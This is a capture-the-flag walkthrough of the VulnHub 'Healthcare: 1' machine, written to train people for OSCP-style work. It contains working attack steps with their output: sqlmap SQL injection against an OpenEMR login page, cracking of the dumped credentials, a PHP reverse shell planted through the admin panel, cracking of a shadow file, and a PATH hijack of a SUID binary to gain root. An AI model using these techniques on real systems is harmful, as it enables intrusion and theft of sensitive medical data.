# VulnHub > Healthcare: 1

**About Release**

* Name: Healthcare: 1
* Date release: 29 Jul 2020
* Author: v1n1v131r4
* Series: Healthcare

**Download**

* File: Healthcare.ova (Size: 918 MB)
* Download: https://drive.google.com/file/d/1BTWbBsOwzAZV7C2rMOyDWAI1hGnE-NaJ/view?usp=sharing
* Download (Mirror): https://download.vulnhub.com/healthcare/Healthcare.ova
* Download (Torrent): https://download.vulnhub.com/healthcare/Healthcare.ova.torrent ([Magnet](magnet:?xt=urn:btih:40DC09B8584D5A1DF74DD9EDCE692E1CF379FDD5&dn=Healthcare.ova&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969))

**Description**

Level: Intermediate

Description:This machine was developed to train the student to think according to the OSCP methodology. Pay attention to each step, because if you lose something you will not reach the goal: to become root in the system.

It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and root.txt.

# User flag

## Services enumeration

There are 2 services running on the target visible by Nmap:

~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3d
80/tcp open  http    Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))
| http-robots.txt: 8 disallowed entries 
| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/ 
|_/all_our_e-mail_addresses /admin/ /
|_http-server-header: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
|_http-title: Coming Soon 2
Service Info: OS: Unix
~~~

## Initial foothold

The FTP service doesn't allow anonymous access. Let's jump to the web enumeration.

There is a `robots.txt` file but it doesn't bring anything interesting.

~~~
kali@kali:/data/healthcare$ curl -s http://healthcare.box/robots.txt
# $Id: robots.txt 410967 2009-08-06 19:44:54Z oden $
# $HeadURL: svn+ssh://svn.mandriva.com/svn/packages/cooker/apache-conf/current/SOURCES/robots.txt $
# exclude help system from robots
User-agent: *
Disallow: /manual/
Disallow: /manual-2.2/
Disallow: /addon-modules/
Disallow: /doc/
Disallow: /images/
# the next line is a spam bot trap, for grepping the logs. you should _really_ change this to something else...
Disallow: /all_our_e-mail_addresses
# same idea here...
Disallow: /admin/
# but allow htdig to index our doc-tree
#User-agent: htdig
#Disallow:
# disallow stress test
user-agent: stress-agent
Disallow: /
~~~

Running gobuster with several dictionaries eventually revealed the presence of an `/openemr` location.

~~~
kali@kali:/data/healthcare$ gobuster dir -u http://healthcare.box/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://healthcare.box/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/24 13:30:48 Starting gobuster
===============================================================
/index (Status: 200)
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/vendor (Status: 301)
/favicon (Status: 200)
/robots (Status: 200)
/fonts (Status: 301)
/gitweb (Status: 301)
/phpMyAdmin (Status: 403)
/server-status (Status: 403)
/server-info (Status: 403)
/openemr (Status: 301)
===============================================================
2020/09/24 13:37:47 Finished
===============================================================
~~~

## Exploiting OpenEMR

Checking online for exploits against OpenEMR led to the disclosure of several SQL injection vulnerabilities (https://packetstormsecurity.com/files/108328/OpenEMR-4.1.0-SQL-Injection.html). The `validateUser.php` is confirmed to be vulnerable to SQLi:

~~~
kali@kali:/data/healthcare/files$ sqlmap -u http://healthcare.box/openemr/interface/login/validateUser.php?u=1 --dbs

[REDACTED]

---
[14:05:02] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[14:05:02] [INFO] fetching database names
[14:05:02] [INFO] retrieved: 'information_schema'
[14:05:02] [INFO] retrieved: 'openemr'
[14:05:02] [INFO] retrieved: 'test'
available databases [3]:
[*] information_schema
[*] openemr
[*] test

[REDACTED]
~~~

Now that we have confirmed the vulnerability and got confirmation of the existence of an `openemr` database, we list the tables and notice a `users` table. Let's dump its content:

~~~
kali@kali:/data/healthcare/files$ sqlmap -u http://healthcare.box/openemr/interface/login/validateUser.php?u=1 -D openemr -T users --dump

[REDACTED]

[14:07:31] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] 
do you want to crack them via a dictionary-based attack? [Y/n/q] 
[14:07:44] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
2
what's the custom dictionary's location?
> /usr/share/wordlists/rockyou.txt
[14:08:11] [INFO] using custom dictionary
do you want to use common password suffixes? (slow!) [y/N] 
[14:08:16] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[14:08:16] [INFO] starting 2 processes 
[14:08:16] [INFO] cracked password 'medical' for user 'medical'
[14:08:24] [INFO] cracked password 'ackbar' for user 'admin'
[14:10:42] [INFO] cracked password 'medical' for user 'medical'  
Database: openemr

Table: users
[2 entries]

[REDACTED]
~~~

`sqlmap` really helps here and is even able to brute force the password hashes. Valid credentials are found for the `admin` account: `admin:ackbar`.

I tried using an authenticated RCE exploit from exploit-db but it did not work despite the "payload executed" message. Let's try something else.

From the OpenEMR admin panel, we can modify the PHP code of pages. Go to `Administration > Files` and select `config.php` from the dropdown. Modify the content with the one from a PHP reverse shell.

Now browse the resource:

~~~
$ curl http://healthcare.box/openemr/sites/default/config.php
~~~

A reverse shell will be spawned in our listener window:

~~~
kali@kali:/data/healthcare$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.16.222.128] from (UNKNOWN) [172.16.222.141] 56537
Linux localhost.localdomain 2.6.38.8-pclos3.bfs #1 SMP PREEMPT Fri Jul 8 18:01:30 CDT 2011 i686 i686 i386 GNU/Linux
 07:41:23 up  1:47,  0 users,  load average: 1.00, 1.00, 1.02
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
uid=479(apache) gid=416(apache) groups=416(apache)
sh: no job control in this shell
bash-4.1$ cd /home
cd /home
bash-4.1$ ls -la
ls -la
total 20
drwxr-xr-x  5 root     root     4096 Jul 29 04:46 .
drwxr-xr-x 21 root     root     4096 Sep 24 05:54 ..
drwxr-xr-x 27 almirant almirant 4096 Jul 29 12:37 almirant
drwxr-xr-x 31 medical  medical  4096 Nov  5  2011 medical
drwxr-xr-x  3 root     root     4096 Nov  4  2011 mysql
~~~

## User flag

The user flag is located in `almirant`'s home folder:

~~~
bash-4.1$ cat /home/almirant/user.txt
cat /home/almirant/user.txt
d41d8cd98f00b204e9800998ecf8427e
~~~

User flag: `d41d8cd98f00b204e9800998ecf8427e`


# Root flag

## Lateral move (apache -> medical)

As there is a user named `medical` and sqlmap found the password on the application, it was fair to try to log in as `medical` with the password `medical`:

~~~
bash-4.1$ su medical
su medical
Password: medical
~~~

To be noted that there is a readable copy of `shadow` under `/var/backups/`:

~~~
[medical@localhost backups]$ ls -la /var/backups/shadow
ls -la /var/backups/shadow
-rwxr--r-- 1 medical medical 1124 Jul 29 06:11 /var/backups/shadow*
~~~

Brute forcing the `shadow` file leads to disclosing the password for 2 accounts:

~~~
kali@kali:/data/healthcare/files$ /data/src/john/run/john shadow --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 256 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
skywalker        (almirant)
medical          (medical)
~~~

## Root SUID files

Searching for files owned by `root` with the SUID bit set reveals an interesting executable:

~~~
[medical@localhost ~]$ find / -type f -user root -perm -u=s 2>/dev/null
find / -type f -user root -perm -u=s 2>/dev/null
/usr/libexec/pt_chown
/usr/lib/ssh/ssh-keysign
/usr/lib/polkit-resolve-exe-helper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/chromium-browser/chrome-sandbox
/usr/lib/polkit-grant-helper-pam
/usr/sbin/fileshareset
/usr/sbin/traceroute6
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/bin/crontab
/usr/bin/pumount
/usr/bin/expiry
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/wvdial
/usr/bin/pmount
/usr/bin/sperl5.10.1
/usr/bin/gpgsm
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/passwd
/usr/bin/gpg
/usr/bin/healthcheck <---------------- interesting!
/usr/bin/Xwrapper
/usr/bin/ping6
/usr/bin/chsh
/lib/dbus-1/dbus-daemon-launch-helper
/sbin/pam_timestamp_check
/bin/ping
/bin/fusermount
/bin/su
/bin/mount
/bin/umount
~~~

## Privilege escalation

Using `strings`, we can notice that a serie of commands is called by the program, without absolute paths:

~~~
[medical@localhost /]$ strings /usr/bin/healthcheck
strings /usr/bin/healthcheck

[REDACTED]

clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h
~~~

We can take advantage of this vulnerability to make a local copy of `/bin/bash` to `~/clear` and add our home directory to the `PATH` variable. That way, the `clear` command will actually execute `bash` as root.

~~~
[medical@localhost ~]$ which bash
which bash
/bin/bash
[medical@localhost ~]$ cp /bin/bash clear
cp /bin/bash clear
[medical@localhost ~]$ export PATH=/home/medical:$PATH
export PATH=/home/medical:$PATH
[medical@localhost ~]$ /usr/bin/healthcheck
/usr/bin/healthcheck
[root@localhost ~]# id
id
uid=0(root) gid=0(root) groups=0(root),7(lp),19(floppy),22(cdrom),80(cdwriter),81(audio),82(video),83(dialout),100(users),490(polkituser),500(medical),501(fuse)
~~~

## Root flag

~~~
[root@localhost ~]# cd /root
cd /root
[root@localhost root]# cat root.txt
cat root.txt
██    ██  ██████  ██    ██     ████████ ██████  ██ ███████ ██████      ██   ██  █████  ██████  ██████  ███████ ██████  ██ 
 ██  ██  ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ██ 
  ████   ██    ██ ██    ██        ██    ██████  ██ █████   ██   ██     ███████ ███████ ██████  ██   ██ █████   ██████  ██ 
   ██    ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██    
   ██     ██████   ██████         ██    ██   ██ ██ ███████ ██████      ██   ██ ██   ██ ██   ██ ██████  ███████ ██   ██ ██ 
                                                                                                                          
                                                                                                                          
Thanks for Playing!

Follow me at: http://v1n1v131r4.com


root hash: eaff25eaa9ffc8b62e3dfebf70e83a7b 
~~~

Root flag: `eaff25eaa9ffc8b62e3dfebf70e83a7b`
